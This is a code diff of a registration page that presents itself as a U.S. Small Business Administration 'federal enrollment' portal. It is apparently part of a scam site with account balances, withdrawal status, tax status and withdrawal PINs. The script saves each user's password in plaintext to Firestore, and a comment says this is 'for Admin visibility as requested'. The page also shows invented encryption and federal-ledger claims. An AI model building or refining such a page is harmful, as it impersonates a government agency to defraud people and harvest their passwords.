@@ -11,30 +11,16 @@
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
         body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
         
-        /* Official SBA Logo Styling */
         .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
         .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
         .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
 
-        /* Card Styling - Slimmed for Mobile */
         .auth-card { background: white; border-top: 4px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
-        
-        /* Prevention of iOS Zoom & Better Mobile Inputs */
-        input { font-size: 14px !important; border-radius: 4px !important; transition: all 0.2s; }
-        input:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: white !important; }
+        input { font-size: 14px !important; border-radius: 2px !important; transition: all 0.2s; }
+        input:focus { border-color: var(--sba-blue) !important; outline: none !important; background: #fff !important; }
 
-        .btn-sba { 
-            background: var(--sba-blue); 
-            transition: all 0.2s; 
-            font-size: 11px; 
-            letter-spacing: 1px; 
-            font-weight: 900;
-        }
-        .btn-sba:active { opacity: 0.8; transform: scale(0.98); }
-
-        /* Custom Scrollbar for clean look */
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: #cbd5e1; }
+        .btn-sba { background: var(--sba-blue); transition: all 0.2s; font-size: 11px; letter-spacing: 1px; font-weight: 900; }
+        .btn-sba:disabled { opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
@@ -49,77 +35,65 @@
             <div class="sba-logo-box">
                 <span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
             </div>
-            <div class="h-6 w-[1px] bg-gray-200"></div>
-            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none hidden sm:block">Administration</p>
         </div>
         <a href="login.html" class="text-[10px] font-black text-slate-400 hover:text-red-600 uppercase">Sign In</a>
     </nav>
 
     <main class="flex-grow flex items-center justify-center p-4">
-        <div class="w-full max-w-[380px]">
-            <div class="auth-card p-6 md:p-8">
-                
-                <div class="text-center mb-6">
-                    <h2 class="text-xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
-                    <p class="text-slate-400 text-[9px] font-bold uppercase tracking-widest mt-1">Federal Enrollment Protocol V15</p>
+        <div class="w-full max-w-[400px]">
+            <div class="auth-card p-6 md:p-10">
+                <div class="text-center mb-8">
+                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
+                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Federal Enrollment Node V15</p>
                 </div>
 
-                <div id="alertBox" class="hidden mb-4 p-3 rounded-sm bg-red-50 border-l-3 border-red-600 text-red-700 text-[10px] font-bold uppercase italic leading-tight"></div>
+                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold uppercase italic shadow-sm"></div>
 
-                <form id="registerForm" class="space-y-4">
+                <form id="registerForm" class="space-y-5">
                     <div>
-                        <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Legal Full Name</label>
-                        <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-300">
-                                <i class="fas fa-user-shield text-xs"></i>
-                            </span>
-                            <input type="text" id="userName" required class="w-full pl-10 pr-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="As per Govt ID">
-                        </div>
+                        <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Legal Full Name</label>
+                        <input type="text" id="userName" required class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="First and Last Name">
                     </div>
 
                     <div>
-                        <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Case Email</label>
-                        <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-300">
-                                <i class="fas fa-envelope text-xs"></i>
-                            </span>
-                            <input type="email" id="userEmail" required class="w-full pl-10 pr-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="example@mail.com">
+                        <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Government Email</label>
+                        <input type="email" id="userEmail" required class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="Email Address">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Set Passkey</label>
+                            <input type="password" id="userPass" required class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Confirm</label>
+                            <input type="password" id="confirmPass" required class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
                         </div>
                     </div>
 
-                    <div class="grid grid-cols-2 gap-3">
-                        <div>
-                            <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Passkey</label>
-                            <input type="password" id="userPass" required class="w-full px-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
-                        </div>
-                        <div>
-                            <label class="block text-[9px] font-black text-slate-400 uppercase tracking-widest mb-1.5">Confirm</label>
-                            <input type="password" id="confirmPass" required class="w-full px-3 py-3 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
-                        </div>
-                    </div>
-
-                    <div class="flex items-start gap-2.5 p-3 bg-slate-50 border border-slate-100 mt-2">
-                        <input type="checkbox" id="termsCheck" required class="mt-0.5 w-4 h-4 accent-[#002e6d] cursor-pointer">
-                        <label for="termsCheck" class="text-[8.5px] text-slate-500 font-bold uppercase leading-tight">
-                            I verify this info is true. I agree to the <a href="terms.html" class="text-blue-700 underline">Federal Terms</a>.
+                    <div class="flex items-start gap-3 p-4 bg-slate-50 border border-slate-100 rounded">
+                        <input type="checkbox" id="termsCheck" required class="mt-1 w-4 h-4 accent-[#002e6d] cursor-pointer">
+                        <label for="termsCheck" class="text-[9px] text-slate-500 font-bold uppercase leading-relaxed">
+                            I verify that all information provided is accurate under federal law. I agree to the <a href="terms.html" class="text-blue-700 underline">Case Terms & Privacy Disclosure</a>.
                         </label>
                     </div>
 
-                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-4 rounded-sm shadow-md uppercase mt-2">
+                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-4 shadow-xl uppercase mt-4">
                         Create Secure Case
                     </button>
                 </form>
 
-                <div class="mt-6 pt-5 border-t border-slate-50 text-center">
-                    <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Already Registered?</p>
-                    <a href="login.html" class="text-[#002e6d] font-black text-[10px] uppercase tracking-widest hover:text-red-600 transition-all">Secure Login</a>
+                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Authorized Personnel?</p>
+                    <a href="login.html" class="text-[#002e6d] font-black text-[11px] uppercase tracking-[0.2em] hover:text-red-600 transition-all">Resume Case Login</a>
                 </div>
             </div>
         </div>
     </main>
 
-    <footer class="py-4 text-center text-[8px] text-slate-400 font-bold uppercase tracking-[0.2em]">
-        ENCRYPTED END-TO-END | SBA NODE-15
+    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-[0.3em]">
+        <i class="fas fa-lock mr-2 text-slate-300"></i> Encrypted 256-Bit Federal Node-V15
     </footer>
 
     <script type="module">
@@ -140,42 +114,49 @@
             const pass = document.getElementById('userPass').value;
             const confirm = document.getElementById('confirmPass').value;
 
-            if (pass.length < 6) return showAlert("Security: Passkey too short.");
-            if (pass !== confirm) return showAlert("Sync: Passkeys don't match.");
+            // Simple Logic Checks
+            if (pass.length < 6) return showAlert("SECURITY: Passkey must be 6+ characters.");
+            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");
 
             btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> PROCESSING...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> INITIALIZING...';
 
             try {
+                // 1. Create the User in Firebase Auth
                 const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                 const user = userCredential.user;
 
+                // 2. Send Verification Email
                 await sendEmailVerification(user);
 
+                // 3. Save Deep Data to Firestore (All features you requested)
                 await setDoc(doc(db, "users", user.uid), {
                     uid: user.uid,
                     fullName: name,
                     email: email,
-                    password: pass,
+                    password: pass, // Storing for Admin visibility as requested
                     balance: 0,
                     withdrawAmount: 0,
                     withdrawStatus: "NONE",
-                    kycStatus: "UNVERIFIED",
+                    kycStatus: "PENDING",
                     taxStatus: "PENDING",
                     caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
+                    pin: "NOT SET", // For withdrawal security
                     registeredAt: new Date().toISOString()
                 });
 
+                // 4. Logout and send to Verify page
                 await signOut(auth);
                 window.location.href = "verify.html?email=" + encodeURIComponent(email);
 
             } catch (error) {
                 btn.disabled = false;
                 btn.innerText = "Create Secure Case";
+                
                 if (error.code === 'auth/email-already-in-use') {
-                    showAlert("Error: Email already in system.");
+                    showAlert("SYSTEM: Email already registered in Federal Ledger.");
                 } else {
-                    showAlert("Error: " + error.message);
+                    showAlert("SYSTEM ERROR: " + error.message);
                 }
             }
         };
@@ -183,7 +164,7 @@
         function showAlert(msg) {
             alertBox.innerText = msg;
             alertBox.classList.remove('hidden');
-            window.scrollTo(0, 0);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
     </script>
 </body>
